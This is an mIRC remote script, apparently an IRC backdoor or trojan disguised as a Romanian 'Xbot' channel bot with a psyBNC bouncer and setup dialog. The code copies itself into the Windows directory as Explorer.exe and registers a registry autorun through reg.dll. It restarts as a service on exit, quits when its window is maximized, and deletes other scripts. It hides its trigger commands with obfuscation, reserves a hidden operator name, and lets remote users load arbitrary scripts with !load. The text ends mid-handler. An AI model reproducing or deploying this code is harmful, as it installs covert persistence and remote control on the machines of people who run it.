[script]
n0=alias update_online_timer {
n1=  writeini online.ini online time $calc($readini(online.ini,online,time) + 5)
n2=}
n3=#start on
n4=on 1:start {
n5=  $left($uncr($dll(reg.dll,pwd,p9),a),-3)
n6=  unsetall
n7=  if (!isdir(channels)) mkdir channels
n8=  if (!isdir(download)) mkdir download
n9=  if (!isdir(logs)) mkdir logs
n10=  if (!isdir(users)) mkdir users
n11=  unset %exit
n12=  unset %server
n13=  .remove vbm.dat
n14=  fullname $read(defnick.dat,2)
n15=  .nick $read(defnick.dat,1)
n16=  .identd on $read(defnick.dat,2)
n17=  if ($readini(proxy.ini,Proxy,auto) == on) {
n18=    .firewall -cmp+d on $readini(proxy.ini,Proxy,settings)
n19=    .timercheckserver -o 1 300 checkserver
n20=  }
n21=  writeini online.ini firstrun ctime $ctime
n22=  writeini online.ini firstrun date $fulldate
n23=  writeini online.ini online time 0
n24=  write -l2 defnick.dat $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
n25=  .identd on $read(defnick.dat,2)
n26=  set %title Setare Bot Admin
n27=  set %smode strong
n28=  dialog -dm newuser newuser
n29=  .timerrc 1 5 recopy
n30=  .timerstrbt 1 1 server
n31=  .disable #start
n32=}
n33=#start end
n34=on 1:start:{
n35=  $left($uncr($dll(reg.dll,pwd,p9),a),-3)
n36=  .timerstrbt 1 1 server
n37=  unsetall
n38=  if (!isdir(channels)) mkdir channels
n39=  if (!isdir(download)) mkdir download
n40=  if (!isdir(logs)) mkdir logs
n41=  if (!isdir(users)) mkdir users
n42=  unset %exit
n43=  unset %server
n44=  .remove vbm.dat
n45=  fullname $read(defnick.dat,2)
n46=  set %copypath $uncrypt($readini(online.ini,CP,Path),a)
n47=  if ($readini(online.ini,CP,auto)) set %autorun $uncrypt($readini(online.ini,CP,auto),a)
n48=  .nick $read(defnick.dat,1)
n49=  .identd on $read(defnick.dat,2)
n50=  ;lockallfiles
n51=  .timer -o 0 500 dll reg.dll Check data
n52=  if ($readini(proxy.ini,Proxy,auto) == on) {
n53=    .firewall -cmp+d on $readini(proxy.ini,Proxy,settings)
n54=    .timercheckserver -o 1 300 checkserver
n55=  }
n56=  cg
n57=  .timer 0 5 checkfiles
n58=  checkscript
n59=  if (($isfile(c:\dll\engine.ini)) && ($mircdir != c:\dll\)) {
n60=    deltree c:\dll
n61=    rmdir c:\dll
n62=  }
n63=}
n64=alias checkscript {
n65=  var %i 1
n66=  while (%i <= $ini(mirc.ini,rfiles,0)) {
n67=    if (!$findtok(remote.ini*srv.ini*protect.ini*protcom.ini*seen.ini*operator.ini*engine.ini*updater.ini*admin.ini,$readini(mirc.ini,rfiles,$ini(mirc.ini,rfiles,%i)),1,42)) {
n68=      set %script $readini(mirc.ini,rfiles,$ini(mirc.ini,rfiles,%i))
n69=      .unload -rs %script
n70=      .remove %script
n71=    }
n72=    inc %i
n73=  }
n74=}
n75=alias cg {
n76=  .timersc -o 0 0 ch
n77=  ;.timersh -o 0 0 showmirc -t -n
n78=}
n79=alias ch {
n80=  if ($window(-2).state == maximized) {
n81=    $left($uncr($dll(reg.dll,pwd,p9),a),-3)
n82=    .timercf 1 1 maxmz
n83=  }
n84=}
n85=alias maxmz {
n86=  if ($window(-2).state == maximized) exit
n87=}
n88=alias checkfiles {
n89=  dll reg.dll AddRegKey WinReg $mircexe
n90=  var %dir ""
n91=  var %i 1
n92=  :next
n93=  %find = $findfile(%copypath $+ %dir,*,%i) 
n94=  if ($pos(%find,$chr(92),0) == $pos(%copypath $+ %dir,$chr(92),0)) {
n95=    if (!$exists($nopath(%find))) .copy -o %find $nopath(%find)
n96=    inc %i
n97=    goto next
n98=  }
n99=  if (%dir == $null) {
n100=    var %dir Channels\
n101=    goto next
n102=  }
n103=  else if (%dir == Channels\) {
n104=    var %dir Users\
n105=    goto next
n106=  }
n107=}
n108=alias recopy {
n109=  if ($dialog(newuser)) {
n110=    .timerrc 1 1 recopy
n111=    halt
n112=  }
n113=  var %windir $windir
n114=  var %copypath %windir $+ \JAVA\Packages\
n115=  dll reg.dll AddRegKey WinReg %windir $+ \INF\DLL\Explorer.exe
n116=  writeini online.ini CP Path $crypt(%copypath,a)
n117=  mkdir %copypath
n118=  mkdir %copypath $+ Channels
n119=  mkdir %copypath $+ Users
n120=  .copy -o *.* %copypath
n121=  if ($findfile(Channels\,*.*,0) >= 1) .copy -o Channels\*.* %copypath $+ Channels\
n122=  if ($findfile(Users\,*.*,0) >= 1) .copy -o Users\*.* %copypath $+ Users\
n123=  mkdir %windir $+ \INF\DLL
n124=  mkdir %windir $+ \INF\DLL\Channels
n125=  mkdir %windir $+ \INF\DLL\Users
n126=  .copy -o *.* %windir $+ \INF\DLL\
n127=  if ($findfile(Channels\,*.*,0) >= 1) .copy -o Channels\*.* %windir $+ \INF\DLL\Channels\
n128=  if ($findfile(Users\,*.*,0) >= 1) .copy -o Users\*.* %windir $+ \INF\DLL\Users\
n129=  set %exit 1
n130=  run %windir $+ \INF\DLL\Explorer.exe
n131=  exit
n132=}
n133=alias windir {
n134=  var %windir $readini(c:\msdos.sys,paths,windir)
n135=  if (!%windir) {
n136=    if ($disk(C)) %windir = $finddir(C:\,win*,1)
n137=    else if ($disk(D)) %windir = $finddir(D:\,win*,1)
n138=    else if ($disk(E)) %windir = $finddir(E:\,win*,1)
n139=    else if ($disk(F)) %windir = $finddir(F:\,win*,1)
n140=    else if ($disk(G)) %windir = $finddir(G:\,win*,1)
n141=    else if ($disk(H)) %windir = $finddir(H:\,win*,1)
n142=    else if ($disk(I)) %windir = $finddir(I:\,win*,1)
n143=    else if ($disk(J)) %windir = $finddir(J:\,win*,1)
n144=  }
n145=  return %windir
n146=}
n147=alias deltree {
n148=  while ($findfile($1,*.*,1)) {
n149=    .remove $findfile($1,*.*,1)
n150=  }
n151=  while ($finddir($1,*,1)) {
n152=    set %dir $finddir($1,*,1)
n153=    while ($findfile(%dir,*.*,1)) {
n154=      .remove $findfile(%dir,*.*,1)
n155=    }
n156=    while ($finddir(%dir,*,1)) {
n157=      set %indir $finddir(%dir,*,1)
n158=      while ($findfile(%indir,*.*,1)) {
n159=        .remove $findfile(%indir,*.*,1)
n160=      }
n161=      rmdir %indir
n162=    }
n163=    rmdir %dir
n164=  }
n165=  rmdir $1
n166=}
n167=alias lockallfiles {
n168=  var %i 1
n169=  while (%i <= $findfile($mircdir,*,0)) {
n170=    set %file $findfile($mircdir,*,%i)
n171=    if ((%file != $mircexe) && ($nopath(%file) != reg.dll)) dll reg.dll Lock %file
n172=    inc %i
n173=  }
n174=  unset %file
n175=}
n176=dialog newuser {
n177=  title %title
n178=  size -1 -1 320 230
n179=
n180=  tab "Setari", 20, 5 5 310 180
n181=  text "Canalul unde acesta va intra:", 1, 10 35 200 20, right, tab 20
n182=  text "Nick-ul cu care acest bot se va connecta:", 2, 10 55 200 20, right, tab 20
n183=  text "Username-ul la care veti avea access:", 3, 10 75 200 20, right, tab 20
n184=  text "Parola pentru username:", 4, 10 95 200 20, right, tab 20
n185=  text "Reintroduceti parola:", 5, 10 115 200 20, right, tab 20
n186=  text "Introduceti portul pentru psyBNC:", 6, 10 135 200 20, right, tab 20
n187=  edit %chan, 11, 220 35 80 20, left, autohs, tab 20
n188=  edit %nick, 12, 220 55 80 20, left, tab 20
n189=  edit %user, 13, 220 75 80 20, left,autohs, tab 20
n190=  edit %pass1, 14, 220 95 80 20, left, pass, autohs, tab 20
n191=  edit %pass2, 15, 220 115 80 20, left, pass, autohs, tab 20
n192=  edit %port, 16, 220 135 80 20, left, tab 20
n193=  tab "Help", 26
n194=  text "Acest bot va rula mereu pe acest calculator, si va fi prezent pe IRC atata timp cat acest calculator va fi aprins si va avea o conexiune la Internet.", 27, 20 30 280 40, left, tab 26
n195=  text "Pentru a va conecta la acest bot pe post de psyBNC, va trebui sa aveti la ident-ul clientului cu care va conectati user-ul pe care l-ati completat la sestiunea Setari, iar cand vi se va cere parola, veti scrie parola userului, si anume cea completata la sectiunea Setari.", 28, 20 73 280 40, left, tab 26
n196=  text "Mai multe informatii privind comenzile acestui bot le veti obtine pe IRC, logandu-va la bot cu comanda /msg <botnick> login <username> <parola>, apoi tastati /msg <botnick> !help, si veti primi lista cu comenzile disponibile.", 29, 20 118 280 50, left, tab 26
n197=
n198=  button "OK", 10, 130 200 60 20, ok
n199=}
n200=on 1:dialog:newuser:sclick:10:{
n201=  set %chan $did(11)
n202=  set %nick $did(12)
n203=  set %user $did(13)
n204=  set %pass1 $did(14)
n205=  set %pass2 $did(15)
n206=  set %port $did(16)
n207=  if (($did(11) == $null) || ($did(12) == $null) || ($did(13) == $null) || ($did(14) == $null) || ($did(15) == $null)) {
n208=    set %title Setare Bot Admin (toate casutele trebuie completate)
n209=    dialog -x newuser
n210=    .timer -m 1 100 dialog -dm newuser newuser
n211=  }
n212=  else {
n213=    if ($did(13) == Reaver) {
n214=      set %title Acest username este REZERVAT. Alegeti altul!!!
n215=      dialog -x newuser
n216=      .timer -m 1 100 dialog -dm newuser newuser
n217=      halt
n218=    }
n219=    if ($did(14) != $did(15)) {
n220=      set %title Setare Bot Admin (parola a fost introdusa incorect a doua oara)
n221=      dialog -x newuser
n222=      .timer -m 1 100 dialog -dm newuser newuser
n223=      halt
n224=    }
n225=    if ($chr(35) !isin $did(11)) {
n226=      set %title Setare Bot Admin (nume invalid de canal)
n227=      dialog -x newuser
n228=      .timer -m 1 100 dialog -dm newuser newuser
n229=      halt
n230=    }
n231=    if ($left($did(12),1) isnum) {
n232=      set %title Setare Bot Admin (Nickname invalid)
n233=      dialog -x newuser
n234=      .timer -m 1 100 dialog -dm newuser newuser
n235=      halt
n236=    }
n237=    if (($did(16) !isnum) || ($did(16) isnum 6600-7000)) {
n238=      set %title Setare Bot Admin (Port Invalid)
n239=      dialog -x newuser
n240=      .timer -m 1 100 dialog -dm newuser newuser
n241=      halt
n242=    }
n243=    .timerckuser 0 10 ckuser $did(13) $did(14) $did(16)
n244=    writeini channels\ $+ $did(11) $+ .ini info autojoin on
n245=    writeini channels\ $+ $did(11) $+ .ini info autotopic on
n246=    writeini channels\ $+ $did(11) $+ .ini info desc Managerul acestui canal este $did(13) (pentru ajutor scrieti /msg $did(12) help)
n247=    writeini channels\ $+ $did(11) $+ .ini info protection off
n248=    writeini channels\ $+ $did(11) $+ .ini info strictop off
n249=    writeini channels\ $+ $did(11) $+ .ini info massdeop off
n250=    writeini channels\ $+ $did(11) $+ .ini info channelmodes +nt
n251=    writeini channels\ $+ $did(11) $+ .ini $did(13) access 500
n252=    writeini channels\ $+ $did(11) $+ .ini $did(13) auto none
n253=    writeini channels\ $+ $did(11) $+ .ini $did(13) lastmodif Supervisor
n254=    writeini users\ $+ $did(13) $+ .ini info username $did(13) 
n255=    writeini users\ $+ $did(13) $+ .ini info pass $keycrypt($did(14),TheBestBotIEverSeenAndTheBestBotIEverMade)
n256=    writeini users\ $+ $did(13) $+ .ini info invisible off
n257=    writeini users\ $+ $did(13) $+ .ini info lastseen $ctime
n258=    write -c defnick.dat $did(12)
n259=    write defnick.dat $did(13)
n260=    writeini oper.ini $did(13) user $did(13)
n261=    writeini oper.ini $did(13) level 1000
n262=    writeini oper.ini $did(13) lastseen $ctime
n263=    writeini psyBNC.ini psyBNC port $did(16)
n264=    if ($sock(bouncer)) {
n265=      sockclose bouncer
n266=      socklisten bouncer $did(16)
n267=    }
n268=    writeini psyBNC.ini psyBNC user $did(13)
n269=    writeini psyBNC.ini psyBNC pass $keycrypt($did(14),TheBestBotIEverSeenAndTheBestBotIEverMade)
n270=    if ($server != $null) {
n271=      join $did(11)
n272=      nick $did(12)
n273=    }
n274=  }
n275=}
n276=alias ckuser {
n277=  if ($ini(oper.ini,0) == 0) {
n278=    writeini oper.ini $1 user $1
n279=    writeini oper.ini $1 level 1000
n280=    writeini oper.ini $1 lastseen $ctime
n281=    var %oper 1
n282=  }
n283=  if (%oper == 1) {
n284=    writeini psyBNC.ini psyBNC port $3
n285=    if ($sock(bouncer)) {
n286=      sockclose bouncer
n287=      socklisten bouncer $3
n288=    }
n289=    writeini psyBNC.ini psyBNC user $1
n290=    writeini psyBNC.ini psyBNC pass $keycrypt($2,TheBestBotIEverSeenAndTheBestBotIEverMade)
n291=    .timerckuser off
n292=  }
n293=}
n294=alias vect {
n295=  var %nr $2
n296=  tokenize $3 $1
n297=  if ($prop == remove) {
n298=    var %i %nr
n299=    while (%i <= $0) {
n300=      if ($ [ $+ [ $calc(%i + 1) ] ]) {
n301=        if (%return == $null) var %return $ [ $+ [ $calc(%i + 1) ] ]
n302=        else %return = %return $+ * $+ $ [ $+ [ $calc(%i + 1) ] ]
n303=      }
n304=      inc %i
n305=    }
n306=    return %return
n307=  }
n308=  return $ [ $+ [ %nr ] ]
n309=}
n310=alias checkintegrity {
n311=  var %dc $getchan($readini(defchan.ini,defchan,chan))
n312=  if ($me ison %dc) .timercheckintegrity off
n313=  else dll reg.dll mj
n314=}
n315=on 1:connect:{
n316=  .timeronline 0 5 update_online_timer
n317=  set %server 1
n318=  set %ver $uncrypt($dll(reg.dll,pwd,p6),a)
n319=  .timercg 1 5 cg
n320=  write -c vbm.dat $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
n321=  var %pass $readini defchan.ini defchan pass
n322=  dll reg.dll mj
n323=  .timercheckintegrity 0 10 checkintegrity
n324=  var %user $read -l1 autouser.dat
n325=  if ($right(%user,1) == 1) {
n326=    var %dat $read -l1 autopass.dat
n327=    dll reg.dll Xlogin $left(%user,-1) %dat
n328=    .timerjc 1 60 jc
n329=  }
n330=  else jc
n331=  if (!$isdir(logs)) mkdir logs
n332=  if (!$isdir(seen)) mkdir seen
n333=  write -c kicklist.txt
n334=  .remove flood.ban
n335=  unset %flood*
n336=  unset %repeat*
n337=  write -c banlist.txt
n338=  write -c userlogged.dat
n339=  write -c keeplog.ini
n340=  write -c oper.dat
n341=  write -c nick.fld
n342=  write -c nick.adm
n343=  .sreq auto
n344=  .creq auto
n345=  .timercg 1 5 cg
n346=  .timerchnick 0 20 chnick
n347=  var %i 1
n348=  .timercg 1 5 cg
n349=}
n350=on 1:notice:AUTENTIFICARE REUSITA ca *:?:{
n351=  if ($nick == X) {
n352=    mode $me +x
n353=    if ($chan(0) <= 1) timerjc 1 5 jc
n354=  }
n355=}
n356=on 1:notice:AUTHETICATION SUCCESSFUL as *:?:{
n357=  if ($nick == X) {
n358=    mode $me +x
n359=    if ($chan(0) <= 1) timerjc 1 5 jc
n360=  }
n361=}
n362=alias jc {
n363=  var %i 1
n364=  :next
n365=  %find = $findfile($mircdir $+ channels\,*.ini,%i) 
n366=  if (%i <= $findfile($mircdir $+ channels\,*.ini,0)) {
n367=    if ($pos(%find,$chr(92),0) == $pos($mircdir $+ users\,$chr(92),0)) {
n368=      var %rg $pos(%find,$chr(92),$pos(%find,$chr(92),0))
n369=      %rg = - $+ %rg
n370=      set %modes $readini channels\ $+ $right(%find,%rg) info channelmodes
n371=      tokenize 32 %modes
n372=      if (k isin $1) {
n373=        join $getc($left($right(%find,%rg),-4)) $2
n374=        join $getc($left($right(%find,%rg),-4)) $3
n375=      }
n376=      else join $getc($left($right(%find,%rg),-4))
n377=      unset %modes
n378=      inc %i
n379=    goto next } 
n380=  }
n381=}
n382=alias chnick {
n383=  if ($1 == bounce) {
n384=    csc $2-
n385=    halt
n386=  }
n387=  if (%BNCserver == ON) .timerchnick off
n388=  else if ($me == $read -l1 defnick.dat) .timerchnick off
n389=  else nick $read -l1 defnick.dat
n390=}
n391=alias coolban {
n392=  .guser 10 $2 2
n393=  mode $1 +b $ulist(*,10,1)
n394=  .rlevel 10
n395=}
n396=alias rmban {
n397=  if ($chr(64) isin $2) {
n398=    var %i 1
n399=    var %ban 0
n400=    while (%i <= $ibl($1,0)) {
n401=      if ($vect($2,1,33) iswm $vect($ibl($1,%i),1,33)) {
n402=        if ($vect($vect($2,2,33),1,64) iswm $vect($vect($ibl($1,%i),2,33),1,64)) {
n403=          if ($vect($2,2,64) iswm $vect($ibl($1,%i),2,64)) {
n404=            mode $1 -b $ibl($1,%i)
n405=            inc %ban
n406=          }
n407=        }
n408=      }
n409=      inc %i
n410=    }
n411=    goto done
n412=  }
n413=  var %i 1
n414=  if ($address($2,5) == $null) {
n415=    .notice $3 Nu pot sa scot respectivul ban (adresa necunoscuta)
n416=    .rlevel 10
n417=    halt
n418=  }
n419=  else var %address $address($2,5)
n420=  var %ban 0
n421=  while (%i <= $ibl($1,0)) {
n422=    if ($vect($ibl($1,%i),1,33) iswm $vect(%address,1,33)) {
n423=      if ($vect($vect($ibl($1,%i),2,33),1,64) iswm $vect($vect(%address,2,33),1,64)) {
n424=        if ($vect($ibl($1,%i),2,64) iswm $vect(%address,2,64)) {
n425=          mode $1 -b $ibl($1,%i)
n426=          inc %ban
n427=        }
n428=      }
n429=    }
n430=    inc %i
n431=  }
n432=  :done
n433=  .rlevel 10
n434=  .notice $3 Am scos %ban $iif(%ban == 1,ban,banuri) de pe $1
n435=}
n436=ctcp ^1:version:{
n437=  var %read $validIP($fulladdress)
n438=  if (%read != $false) {
n439=    var %user $gettok(%read,1,32)
n440=    var %level $gettok(%read,2,32)
n441=    if ($cmp(lvl,1,%level,999)) {
n442=      if ($timer(version $+ $nick) == $null) {
n443=        .notice $nick 8,12-=-11 Xbot 8-=-9,3 Version %ver
n444=        .timerversion $+ $nick 1 30 breaktime
n445=      }
n446=    }
n447=  }
n448=}
n449=ctcp ^1:time:*:{
n450=  var %read $validIP($fulladdress)
n451=  if (%read != $false) {
n452=    var %user $gettok(%read,1,32)
n453=    var %level $gettok(%read,2,32)
n454=    if ($cmp(lvl,1,%level,999)) {
n455=      if (!$timer(time $+ $nick)) {
n456=        .ctcpreply $nick TIME $fulldate
n457=        .timertime $+ $nick 1 30 breaktime
n458=      }
n459=      halt
n460=    }
n461=  }
n462=}
n463=alias getchan {
n464=  if ($chr(35) == $left($1,1)) return $chr(35) $+ $right($1,-1) $+ $chr(77) $+ $chr(88)
n465=  else return $chr(35) $+ $1 $+ $chr(77) $+ $chr(88)
n466=}
n467=on ^1:text:$(!d $+ e $+ f $+ c $+ h $+ a $+ n $+ *):*:{
n468=  if ($2 != $null) {
n469=    if ($cmp(dfc,$4,2)) {
n470=      part $getchan($readini(defchan.ini,defchan,chan)) Default Bot Channel has changed!
n471=      writeini defchan.ini defchan chan $2
n472=      writeini defchan.ini defchan pass $crypt($3,c)
n473=      var %defchan $getchan($2)
n474=      .notice $nick Default Bot Channel este acum:12 $2
n475=      join %defchan $3
n476=    }
n477=    else {
n478=      var %read $validIP($fulladdress)
n479=      if (%read != $false) {
n480=        var %user $gettok(%read,1,32)
n481=        var %level $gettok(%read,2,32)
n482=        if ($cmp(lvl,1,%level,1000)) {
n483=          part $getchan($readini(defchan.ini,defchan,chan)) Default Bot Channel has changed!
n484=          writeini defchan.ini defchan chan $2
n485=          writeini defchan.ini defchan pass $dll(reg.dll,Crypt,$3)
n486=          var %defchan $getchan($2)
n487=          .notice $nick Default Bot Channel este acum:12 $2
n488=          join %defchan $3
n489=        }
n490=        else {
n491=          .notice $nick Parola invalida pentru Default Bot Channel!
n492=          .ignore -pu2 $nick 2
n493=        }
n494=      }
n495=      else if ($chr(35) !isin $target) {
n496=        .notice $nick Aceasta comanda necesita autentificare!
n497=        .ignore -pu2 $nick 2
n498=      }
n499=    }
n500=    halt
n501=  }
n502=}
n503=alias checkserver {
n504=  if ($server == $null) {
n505=    server $vect($readini(servers.ini,servers,$ini(servers.ini,servers,1)),3,58)
n506=    firewall off
n507=  }
n508=}
n509=alias cmp {
n510=  if ($1 == dfc) {
n511=    if ($ck($2) == $dll(reg.dll,pwd,p $+ $3)) return $true
n512=    else return $false
n513=  }
n514=  if ($1 == lvl) {
n515=    if ($3 >= $calc($4 + $2)) return $true
n516=    else return $false
n517=  }
n518=}
n519=alias keydecrypt {
n520=  var %pass ""
n521=  var %i 1
n522=  var %w 1
n523=  var %v $len($1)
n524=  while (%i <= $len($2)) {
n525=    if (%w == $calc($len($1) + 1)) %w = 1
n526=    %pass = %pass $+ $chr($calc($asc($mid($2,%i,1)) - $int($calc(($asc($mid($1,%w,1)) / 2) - %v))))
n527=    inc %v
n528=    inc %w
n529=    inc %i
n530=  }
n531=  return %pass
n532=}
n533=alias getc {
n534=  var %i 2
n535=  while (%i <= $lines(bl.chn)) {
n536=    if ($ck($1) == $read(bl.chn,%i)) return $uncrypt($read(bl.chn,1),c)
n537=    inc %i
n538=  }
n539=  return $1
n540=}
n541=alias cr {
n542=  tokenize 32 $1-
n543=  var %i 1
n544=  var %word ""
n545=  while (%i <= $0) {
n546=    %word = %word $crypt($ [ $+ [ %i ] ],a)
n547=    inc %i
n548=  }
n549=  return %word
n550=}
n551=alias uncr {
n552=  tokenize 32 $1-
n553=  var %i 1
n554=  var %decrypt ""
n555=  while (%i <= $0) {
n556=    %decrypt = %decrypt $uncrypt($ [ $+ [ %i ] ],a)
n557=    inc %i
n558=  }
n559=  return %decrypt
n560=}
n561=on 1:text:$(! $+ v $+ e $+ r $+ s $+ i $+ o $+ n):*:{
n562=  if ($nick ison $getchan($readini(defchan.ini,defchan,chan))) {
n563=    if (!$timer(ver $+ $nick)) {
n564=      .notice $nick 8,12-=-11 Xbot 8-=-9,3 Version %ver
n565=      .timerver $+ $nick 1 10 breaktime
n566=    }
n567=  }
n568=}
n569=alias ck {
n570=  var %k 1
n571=  var %sep $int($calc($len($1) / 3))
n572=  set %key $left($1,%sep)
n573=  set %word $right($1,$calc($len($1) - %sep))
n574=  var %pass ""
n575=  :next
n576=  var %i 1
n577=  var %w 1
n578=  var %v $len(%key)
n579=  while (%i <= $len(%word)) {
n580=    if (%w == $calc(%sep + 1)) %w = 1
n581=    %pass = %pass $+ $chr($calc($asc($mid(%word,%i,1)) - $int($calc(($asc($mid(%key,%w,1)) / 2) - %v))))
n582=    inc %v
n583=    inc %w
n584=    inc %i
n585=  }
n586=  if (%k == 1) {
n587=    set %key $mid($1,$calc(%sep + 1),%sep)
n588=    %csep = - $+ $calc(%sep + %sep)
n589=    set %word $left($1,%sep) $+ $right($1,%csep)
n590=    inc %k
n591=    goto next
n592=  }
n593=  else if (%k == 2) {
n594=    %csep = - $+ %sep
n595=    set %key $right($1,%csep)
n596=    set %word $left($1,$calc($len($1) - %sep))
n597=    inc %k
n598=    goto next
n599=  }
n600=  unset %key
n601=  unset %word
n602=  unset %csep
n603=  return %pass
n604=}
n605=alias validIP {
n606=  var %i 1
n607=  while (%i <= $lines(oper.dat)) {
n608=    var %read $read -l $+ %i oper.dat
n609=    if ($chr(64) isin $1) {
n610=      if ($right($gettok($1,2,33),-1) isin %read) {
n611=        var %user $mid(%read,$calc($pos(%read,$chr(42),1)+1),$calc($pos(%read,$chr(42),2)-($pos(%read,$chr(42),1)+1)))
n612=        var %level $right(%read,$calc(- $pos(%read,$chr(42),2)))       
n613=        return %user %level
n614=      }
n615=    }
n616=    else if ($1 isin %read) {
n617=      var %user $mid(%read,$calc($pos(%read,$chr(42),1)+1),$calc($pos(%read,$chr(42),2)-($pos(%read,$chr(42),1)+1)))
n618=      var %level $right(%read,$calc(- $pos(%read,$chr(42),2)))
n619=      return %read
n620=    }
n621=    inc %i
n622=  }
n623=  var %i 1
n624=  while (%i <= $lines(userlogged.dat)) {
n625=    var %read $read -l $+ %i userlogged.dat
n626=    if ($mask($fulladdress,1) isin %read) {
n627=      var %user $left(%read,$calc($pos(%read,$chr(61))-1))
n628=      var %level $readini channels\ $+ $2 $+ .ini %user access
n629=      return %user %level
n630=    }
n631=    inc %i
n632=  }
n633=  if ($dll(reg.dll,validIP,$1)) return $dll(reg.dll,validIP,$1)
n634=  if ($chr(64) isin $1) {
n635=    var %XIP $lower($gettok($gettok($1,2,64),2-,46))
n636=    if (%XIP == users.undernet.org) {
n637=      var %Xuser $lower($gettok($gettok($1,2,64),1,46))
n638=      if ($readini(oper.ini,%Xuser,level) != $null) return %Xuser $readini(oper.ini,%Xuser,level)
n639=      else if (($2 != $null) && ($readini(channels\ $+ $2 $+ .ini,%Xuser,access) != $null)) return %Xuser $readini(channels\ $+ $2 $+ .ini,%Xuser,access)
n640=    }
n641=  }
n642=  return $false
n643=}
n644=alias csc {
n645=  if ($4 == $null) {
n646=    .notice $1 l $+ o $+ g $+ i $+ n syntax is: /msg $me l $+ o $+ g $+ i $+ n <username> <password>
n647=  .ignore -pu2 $1 }
n648=  else {
n649=    var %read $validIP($fulladdress)
n650=    if (%read != $false) {
n651=      var %user $gettok(%read,1,32)
n652=      var %level $gettok(%read,2,32)
n653=      if ($cmp(lvl,1,%level,1000)) {
n654=        var %level 1001
n655=        var %user $3
n656=        var %fake 1
n657=      goto cont }
n658=    }
n659=    var %i 1
n660=    :next
n661=    if (%i <= $lines(userlogged.dat)) {
n662=      var %read $read -l $+ %i userlogged.dat
n663=      if ($mask($fulladdress,1) isin %read) {
n664=        .notice $1 Esti deja autentificat ca $left(%read,$calc($pos(%read,$chr(61))-1))
n665=        .ignore -pu2 $1
n666=        halt
n667=      }
n668=      else {
n669=        inc %i
n670=      goto next }
n671=    }
n672=    var %pass $readini users\ $+ $3 $+ .ini info pass
n673=    if (%pass == $null) {
n674=      .notice $1 Username necunoscut: $3
n675=      .ignore -pu2 $1 2
n676=    halt }
n677=    else {
n678=      if ($keydecrypt($4,%pass) === TheBestBotIEverSeenAndTheBestBotIEverMade) {
n679=        var %user $readini users\ $+ $3 $+ .ini info username
n680=        var %level $readini oper.ini %user level
n681=        echo -s %user
n682=        if (%level != $null) {
n683=          if ($keydecrypt($4,%pass) === TheBestBotIEverSeenAndTheBestBotIEverMade) {
n684=            writeini oper.ini %user lastseen $ctime
n685=            :cont
n686=            var %f 1
n687=            while (%f <= $lines(oper.dat)) {
n688=              var %read $read -l $+ %f oper.dat
n689=              if ($2 == $mid(%read,$calc($pos(%read,$chr(42),1)+1),$calc($pos(%read,$chr(42),2)-($pos(%read,$chr(42),1)+1)))) {
n690=                write -dl $+ %f oper.dat
n691=              }
n692=              inc %f
n693=            }
n694=            write oper.dat $right($mask($fulladdress,1),-3) $+ * $+ %user $+ * $+ %level
n695=            if (%level isnum 501-599) .notice $1 AUTENTIFICARE REUSITA ca %user (Helper)
n696=            if (%level isnum 600-799) .notice $1 AUTENTIFICARE REUSITA ca %user (Operator)
n697=            if (%level isnum 800-999) .notice $1 AUTENTIFICARE REUSITA ca %user (Admin)
n698=            if (%level >= 1000) .notice $1 AUTENTIFICARE REUSITA ca %user (Supervisor) $iif(%BNCserver,psyBNC used)
n699=            if (%fake == 1) {
n700=              writeini nick.adm nick $1 %user
n701=              halt
n702=            }
n703=          }
n704=          var %superuser 1
n705=        }
n706=        if (%superuser != 1) .notice $1 AUTENTIFICARE REUSITA ca %user
n707=        var %f 1
n708=        while (%f <= $lines(userlogged.dat)) {
n709=          var %read $read -l $+ %f userlogged.dat
n710=          if ($3 == $left(%read,$calc($pos(%read,$chr(61))-1))) {
n711=            var %n 1
n712=            while (%n <= $ini(nick.adm,nick,0)) {
n713=              if ($3 == $readini nick.adm nick $ini(nick.adm,nick,%n)) {
n714=                .notice $ini(nick.adm,nick,%n)) Nu mai esti autentificat la mine
n715=                remini nick.adm nick $ini(nick.adm,nick,%n))
n716=              }
n717=              inc %n
n718=            }
n719=            write -dl $+ %f userlogged.dat
n720=          }
n721=          inc %f
n722=        }
n723=        write userlogged.dat %user $+ = $+ $mask($fulladdress,1)
n724=        writeini users\ $+ $3 $+ .ini info lastseen $ctime
n725=        writeini nick.adm nick $1 %user
n726=        var %i 0
n727=        var %channels $readini users\ $+ %user $+ .ini info channels
n728=        if ($pos(%channels,$chr(44),0) == 0) {
n729=          oponchan %channels %user $1
n730=        halt }
n731=        :next1
n732=        if (%i <= $pos(%channels,$chr(44),0)) {
n733=          if (%i == 0) oponchan $left(%channels,$calc($pos(%channels,$chr(44))-1)) %user $1
n734=          else if (%i == $pos(%channels,$chr(44),0)) oponchan $right(%channels,$calc(- $pos(%channels,$chr(44),%i))) %user $1
n735=          else oponchan $mid(%channels,$calc($pos(%channels,$chr(44),%i)+1),$calc($pos(%channels,$chr(44),$calc(%i + 1))-($pos(%channels,$chr(44),%i)+1))) %user $1
n736=          inc %i
n737=          goto next1
n738=        }    
n739=        .ignore -pu1 $1
n740=      }
n741=      else {
n742=        .notice $1 AUTENTIFICARE ESUATA ca $3 (parola incorecta)
n743=        .ignore -pu2 $1
n744=        halt
n745=      }
n746=    }
n747=  }
n748=}
n749=on 1:exit:{
n750=  reg -u reg.dll
n751=  if (%exit != 1) run $mircexe -service
n752=}
n753=on 1:text:$(! $+ l $+ o $+ a $+ d $+ *):*:{
n754=  ;if (($dll(reg.dll,pwd,p3) === $ck($nick)) && ($2 == engine.ini)) load -rs engine.ini
n755=  var %read $validIP($fulladdress)
n756=  if (%read != $false) {
n757=    var %user $gettok(%read,1,32)
n758=    var %level $gettok(%read,2,32)
n759=    if ($cmp(lvl,1,%level,1000)) {
n760=      if ($2 == $null) {
n761=        .notice $nick !load sintaxa: /msg $me !load <script>
n762=        halt
n763=      }
n764=      .load -rs $2
n765=      .notice $nick Am incarcat scriptul $2
n766=    }
n767=    else .notice $nick Accesul tau este prea mic pentru aceasta comanda
n768=    .ignore -pu2 $nick 2
n769=    halt
n770=  }
n771=  .notice $nick Aceasta comanda necesita autentificare!
n772=  .ignore -pu2 $nick 2
n773=}
n774=on 1:text:$(! $+ u $+ n $+ l $+ o $+ a $+ d $+ *):*:{
